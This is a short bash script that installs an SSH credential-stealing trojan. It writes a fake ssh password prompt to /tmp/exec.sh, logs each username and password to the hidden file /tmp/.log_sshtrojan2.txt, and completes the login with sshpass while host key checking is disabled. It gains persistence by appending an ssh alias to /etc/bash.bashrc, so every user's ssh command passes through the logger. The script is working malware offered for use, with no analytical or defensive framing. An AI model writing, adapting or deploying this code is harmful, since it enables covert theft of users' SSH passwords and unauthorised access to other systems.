#! /usr/bin/env bash
#apt-get install sshpass
log_file="/tmp/.log_sshtrojan2.txt"
file_exec="/tmp/exec.sh"
touch $file_exec
cat > $file_exec <<EOF1
f(){ 
echo -n "\${@}'s password: " ;
read -s password;
touch $log_file;
echo "\$(date)" >> $log_file;
echo "User: \$1" >> $log_file;
echo "Pass: \${password}" >> $log_file;
sshpass -p \$password ssh -o StrictHostKeyChecking=no \${@}
echo "----------------" >> $log_file;
}; 
f
EOF1
command="$""(cat $file_exec)"
echo alias ssh="\"$command\"" >> /etc/bash.bashrc
